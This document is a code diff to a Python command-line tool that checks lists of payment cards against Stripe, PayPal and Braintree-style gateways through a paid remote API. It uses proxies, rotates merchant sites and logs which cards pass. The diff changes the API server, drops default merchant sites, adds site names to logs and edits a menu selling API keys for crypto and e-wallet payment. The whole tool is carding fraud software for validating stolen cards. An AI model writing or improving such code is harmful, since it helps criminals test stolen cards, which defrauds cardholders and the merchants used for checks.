@@ -46,13 +46,8 @@ def initDirectories():
     for gateway in ['stripe', 'ppcp', 'b3']:
         filepath = os.path.join(SITES_DIR, f"{gateway}.txt")
         if not os.path.exists(filepath):
-            defaults = {
-                'stripe': 'weekendwarriors.io',
-                'ppcp': 'wifetomom.com',
-                'b3': 'calipercovers.com'
-            }
             with open(filepath, 'w') as f:
-                f.write(defaults[gateway] + '\n')
+                f.write('')
 
 def installDependencies():
     print(f"{Colors.CYAN}[*] Checking dependencies...{Colors.RESET}")
@@ -77,7 +72,7 @@ def loadConfig():
             pass
     return {
         "api_key": "",
-        "api_base": "https://ey-pi-ay.onrender.com",
+        "api_base": "https://api.isnotsin.com",
         "bot_token": "",
         "chat_id": "",
         "proxy": "",
@@ -197,7 +192,7 @@ def saveToFile(cards, status, timestamp):
     except Exception as e:
         print(f"{Colors.RED}[-] ERROR SAVING FILE: {e}{Colors.RESET}")
 
-def logResult(card, status, code, message, ip, gateway, config):
+def logResult(card, status, code, message, ip, gateway, config, site):
     timestamp = getTimestamp()
     
     statusMap = {
@@ -220,8 +215,8 @@ def logResult(card, status, code, message, ip, gateway, config):
     
     progress = f"{Colors.CYAN}[{checkStats['checked']}/{checkStats['total']}]{Colors.RESET}"
     
-    logLine = f"{timestamp} : {progress} {statusBracket} {formattedCard} | {resultMessage} | {formattedIp} | {gatewayName}"
-    logLineClean = f"{timestamp} : [{statusChar}] {card} | {code.upper()} - {message.upper()} | {ip} | {gatewayName}"
+    logLine = f"{timestamp} : {progress} {statusBracket} {formattedCard} | {resultMessage} | {formattedIp} | {gatewayName} | {site}"
+    logLineClean = f"{timestamp} : [{statusChar}] {card} | {code.upper()} - {message.upper()} | {ip} | {gatewayName} | {site}"
     
     print(logLine)
     
@@ -251,7 +246,7 @@ def logResult(card, status, code, message, ip, gateway, config):
 def checkCard(card, site, gateway, config):
     card = card.strip()
     if not card or '|' not in card:
-        logResult(card, 'ERROR', 'INVALID', 'INVALID CARD FORMAT', 'N/A', gateway, config)
+        logResult(card, 'ERROR', 'INVALID', 'INVALID CARD FORMAT', 'N/A', gateway, config, site)
         return
     
     api_url = f"{config['api_base']}/{gateway}"
@@ -281,15 +276,16 @@ def checkCard(card, site, gateway, config):
         code = data.get('code', 'unknown')
         message = data.get('message', 'No message')
         ip = data.get('site_info', {}).get('proxy_ip', 'N/A')
+        actual_site = data.get('site_info', {}).get('site', site)
         
-        logResult(card, status, code, message, ip, gateway, config)
+        logResult(card, status, code, message, ip, gateway, config, actual_site)
         
     except requests.exceptions.Timeout:
-        logResult(card, 'ERROR', 'TIMEOUT', 'REQUEST TIMEOUT', 'N/A', gateway, config)
+        logResult(card, 'ERROR', 'TIMEOUT', 'REQUEST TIMEOUT', 'N/A', gateway, config, site)
     except requests.exceptions.RequestException as e:
-        logResult(card, 'ERROR', 'CONNECTION', 'CONNECTION ERROR', 'N/A', gateway, config)
+        logResult(card, 'ERROR', 'CONNECTION', 'CONNECTION ERROR', 'N/A', gateway, config, site)
     except Exception as e:
-        logResult(card, 'ERROR', 'EXCEPTION', str(e).upper(), 'N/A', gateway, config)
+        logResult(card, 'ERROR', 'EXCEPTION', str(e).upper(), 'N/A', gateway, config, site)
 
 def loadCards(files):
     cards = []
@@ -337,9 +333,13 @@ def showSites(gateway):
     printBanner()
     sites = loadSites(gateway)
     print(f"{Colors.CYAN}SITES FOR {gateway.upper()}: (sites/{gateway}.txt){Colors.RESET}\n")
-    for idx, site in enumerate(sites, 1):
-        print(f"{Colors.WHITE}[{idx}]{Colors.RESET} {site}")
-    print()
+    
+    if not sites:
+        print(f"{Colors.GRAY}No sites configured. Using SIN-{gateway.upper()} (built-in sites){Colors.RESET}\n")
+    else:
+        for idx, site in enumerate(sites, 1):
+            print(f"{Colors.WHITE}[{idx}]{Colors.RESET} {site}")
+        print()
 
 def configureSites():
     clearScreen()
@@ -376,6 +376,10 @@ def configureSites():
             print(f"{Colors.GREEN}[+] SITE ADDED{Colors.RESET}")
         time.sleep(1)
     elif action == '2':
+        if not sites:
+            print(f"{Colors.RED}[-] NO SITES TO REMOVE{Colors.RESET}")
+            time.sleep(1)
+            return
         showSites(gateway)
         idx = input(f"{Colors.WHITE}SITE NUMBER TO REMOVE: {Colors.RESET}").strip()
         try:
@@ -505,7 +509,7 @@ def configureServer():
             print(f"{Colors.GREEN}[+] SERVER SET{Colors.RESET}")
         time.sleep(1)
     elif choice == '2':
-        config['api_base'] = "https://ey-pi-ay.onrender.com"
+        config['api_base'] = "https://api.isnotsin.com"
         saveConfig(config)
         print(f"{Colors.GREEN}[+] SERVER RESET{Colors.RESET}")
         time.sleep(1)
@@ -556,10 +560,6 @@ def showBuyMenu():
     clearScreen()
     printBanner()
     
-    print(f"{Colors.CYAN}╔════════════════════════════════════════╗")
-    print(f"║         API KEY PRICING               ║")
-    print(f"╚════════════════════════════════════════╝{Colors.RESET}\n")
-    
     print(f"{Colors.WHITE}PUBLIC API KEYS:{Colors.RESET}")
     print(f"{Colors.GREEN}  💵 $5  → 7 DAYS{Colors.RESET}")
     print(f"{Colors.GREEN}  💵 $10 → 15 DAYS{Colors.RESET}")
@@ -572,13 +572,12 @@ def showBuyMenu():
     print(f"  {Colors.GREEN}✓{Colors.RESET} Priority support & updates")
     print(f"  {Colors.GREEN}✓{Colors.RESET} All gateways: Stripe, PPCP, B3")
     print(f"  {Colors.GREEN}✓{Colors.RESET} BIN checker included")
-    print(f"  {Colors.GREEN}✓{Colors.RESET} Proxy support")
-    print(f"  {Colors.GREEN}✓{Colors.RESET} Perfect for building your own tools")
-    print(f"  {Colors.GREEN}✓{Colors.RESET} New gateways added regularly\n")
+    print(f"  {Colors.GREEN}✓{Colors.RESET} Proxy paramater support")
+    print(f"  {Colors.GREEN}✓{Colors.RESET} Perfect for building your own tools\n")
     
     print(f"{Colors.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}")
     print(f"{Colors.WHITE}Contact: {Colors.CYAN}@isnotsin{Colors.RESET}")
-    print(f"{Colors.WHITE}Payment: {Colors.CYAN}Crypto/PayPal{Colors.RESET}")
+    print(f"{Colors.WHITE}Payment: {Colors.CYAN}GCash/Maya/Binance USDT{Colors.RESET}")
     print(f"{Colors.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}\n")
     
     input(f"{Colors.WHITE}Press ENTER to return...{Colors.RESET}")
